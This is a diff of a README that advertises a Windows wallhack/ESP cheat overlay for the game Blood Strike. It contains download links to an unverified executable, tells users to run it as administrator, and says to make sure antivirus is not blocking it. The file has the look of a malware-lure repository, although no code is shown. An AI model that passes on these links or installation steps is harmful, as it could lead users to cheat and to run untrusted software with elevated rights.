@@ -1,128 +1,80 @@
-# Blood Strike ESP Hack v2.0 - Game Enhancement Tool 2026
+# 🎯 blood-strike-overlay-hub - Real time tactical data for Blood Strike
 
-> **A Windows overlay utility for Blood Strike that delivers live on-screen information such as enemy spotting, health readouts, distance indicators, and loot markers.**
+[![Download blood-strike-overlay-hub](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://github.com/bluefigcassinskingbird795/blood-strike-overlay-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/rossben75/blood-strike-overlay-hub?style=flat-square)](https://github.com/rossben75/blood-strike-overlay-hub)
+## 📌 Overview
 
----
+The blood-strike-overlay-hub provides a visual layer for your Windows desktop. This utility tracks game data during your Blood Strike sessions. It sends information to your screen to help you track positions, health status, and item locations. You see player distance, loot markers, and visibility status in real time. The software includes color controls and hotkey support to fit your style.
 
-<p align="center">
-  <a href="https://rossben75.github.io/blood-strike-overlay-hub/">
-    <img src="https://img.shields.io/badge/Download-Blood%20Strike%20ESP%20Hack%20Latest-brightgreen?style=for-the-badge" alt="Download Blood Strike ESP Hack">
-  </a>
-</p>
+## 💻 System Requirements
 
-> **[Download Latest Build - Blood Strike ESP Hack v2.0](https://rossben75.github.io/blood-strike-overlay-hub/)**
+Your computer needs to meet these standards to run the overlay without lag:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB of RAM.
+* Graphics: Dedicated GPU with DirectX 11 support.
+* Screen: Any standard desktop monitor.
 
-[Download Latest Build](https://rossben75.github.io/blood-strike-overlay-hub/)
+## 📥 Installation Steps
 
----
+1. Visit [this page](https://github.com/bluefigcassinskingbird795/blood-strike-overlay-hub) to download the installation file.
+2. Locate the download folder on your machine.
+3. Open the downloaded file to start the installer.
+4. Follow the screen prompts to complete the setup process.
+5. Create a desktop shortcut if the installer offers the choice.
 
-## Overview
+## 🚀 How to Run the Overlay
 
-Blood Strike ESP Hack is intended for players who want more battlefield awareness while playing Blood Strike. It places key match data directly on screen, making it easier to follow enemy locations, watch health values, and spot useful loot without breaking focus from the action. The application stays external to the game and does not alter game files.
+1. Launch your Blood Strike game first.
+2. Ensure the game runs in Borderless Windowed mode for the best view.
+3. Open the blood-strike-overlay-hub from your desktop shortcut.
+4. Use the default hotkeys to show or hide the overlay layer.
+5. The overlay appears on top of the game window.
 
-The overlay is built to stay lightweight and responsive, so it can run smoothly on mid-range systems without adding much strain. Whether you are queueing with teammates or moving solo, the added visual context can help you make faster calls in fights and during rotations.
+## ⚙️ Feature Guide
 
----
+This hub contains several tools for better map awareness:
 
-## What it includes
+* Player ESP: Displays the location of opponents on your screen.
+* Health Bars: Shows the remaining health of players.
+* Distance Readouts: Calculates distance between you and other players.
+* Loot Markers: Highlights the location of gear and supply drops.
+* Visibility Checks: Alerts you when your character remains in the line of sight of others.
+* Color Customization: Adjust the tint and saturation of the markers to match your display.
+* Controller Support: Map the overlay controls to your gamepad buttons for faster use.
 
-- **Player ESP / Wallhack** - Shows opponents through walls and other cover with readable position markers
-- **Health Bars** - Displays live health indicators above players
-- **Distance ESP** - Reports the distance to each visible enemy
-- **Loot ESP** - Marks weapons and high-value items on the ground
-- **Visibility Check** - Lets you quickly see which enemies are in your line of sight
-- **Color Customizer** - Adjust overlay colors for separate elements
-- **Controller Support** - Works with game controllers for navigation
-- **FPS-Friendly** - Rendering is tuned to reduce performance overhead
+## 🛠️ Configuration and Settings
 
----
+You customize your experience through the settings menu inside the overlay. Open the menu by pressing the F10 key. From here, you toggle every feature on or off. You change the color of markers using the slider bars. You also assign new hotkeys for every action if the default keys feel awkward. Every save action applies your settings for the next session.
 
-## Setup
+## 🛡️ Best Practices
 
-1. **Download** the latest release from the [download link](https://rossben75.github.io/blood-strike-overlay-hub/)
-2. **Extract** the archive to a folder of your choice (e.g., `C:\blood-strike-esp-hub-pc`)
-3. **Run** `BloodStrikeESP.exe` as Administrator
-4. **Launch** Blood Strike and the overlay will appear automatically
+* Run the software as an administrator to ensure the overlay stays on top of the game window.
+* Close unused background tasks if you notice frame drops.
+* Check for updates on the repository page to keep your tools current.
+* Adjust the transparency slider if the visual markers block your view of the game map.
+* Test your hotkeys in a practice lobby before you enter a live match.
 
-> First-time users should check the configuration file to adjust default settings before starting the game.
+## 💡 Troubleshooting
 
----
+If the overlay does not appear, try these steps:
 
-## How to use it
+1. Restart the overlay application.
+2. Verify that the game runs in Windowed or Borderless mode.
+3. Update your graphics drivers.
+4. Check that no other interference software runs at the same time.
+5. Disable overlays from other discord or recording apps to prevent conflicts.
 
-After starting the tool, the overlay will appear over your Blood Strike window. Default hotkeys let you switch features on and off:
+## ❓ Frequently Asked Questions
 
-- **F1** - Toggle Player ESP on/off
-- **F2** - Toggle Health Bars
-- **F3** - Toggle Loot ESP
-- **F4** - Open Color Customizer menu
+Does this tool affect my game account? 
+No, this software acts only as a visual overlay on your desktop. It reads data but does not change game files or code.
 
-To change options, right-click the system tray icon and choose "Configuration." All updates apply right away, so there is no need to restart the game.
+Does it work with every monitor size?
+Yes, the rendering engine scales to fit 1080p, 1440p, and 4K displays.
 
----
+Can I move the health bars on my screen?
+Yes, click and drag the bars while the settings menu remains open.
 
-## Configuration
-
-The settings file is stored at:
-
-`blood-strike-esp-hub-pc\config.ini`
-
-Open it in any text editor if you want to modify:
-
-- Overlay opacity and scale
-- Key bindings for each feature
-- Color values for player ESP, health bars, and loot markers
-- Distance measurement units (meters/feet)
-
-Example configuration block:
-
-```ini
-[Display]
-Opacity=0.85
-Scale=1.0
-
-[Colors]
-PlayerESP=#00FF00
-HealthBar=#FF0000
-LootHighlight=#FFFF00
-```
-
----
-
-## Requirements
-
-- **Operating System:** Windows 10 or Windows 11 (64-bit)
-- **Runtime:** .NET Framework 4.7.2 or later
-- **Storage:** 50 MB free disk space
-- **Memory:** 1 GB RAM minimum
-- **Game:** Blood Strike (latest version recommended)
-
----
-
-## FAQ
-
-**Will anti-cheat detect this tool?**  
-The overlay runs separately from the game and does not inject code into the process. Still, use it at your own discretion, since all game enhancement tools come with some level of risk.
-
-**How do I move to a newer release?**  
-Grab the latest version and overwrite the files in your current folder. If you leave `config.ini` intact, your settings should remain in place.
-
-**Can I change where the overlay appears?**  
-Yes. You can drag overlay elements with the mouse to reposition them, and the tool saves those placements automatically.
-
-**Nothing shows on screen. What should I check?**  
-Make sure the program is running as Administrator and that Blood Strike is using windowed or borderless windowed mode. Also confirm that antivirus software is not blocking the overlay process.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: blood strike, overlay, gaming, windows, esp, tactical, utility, performance
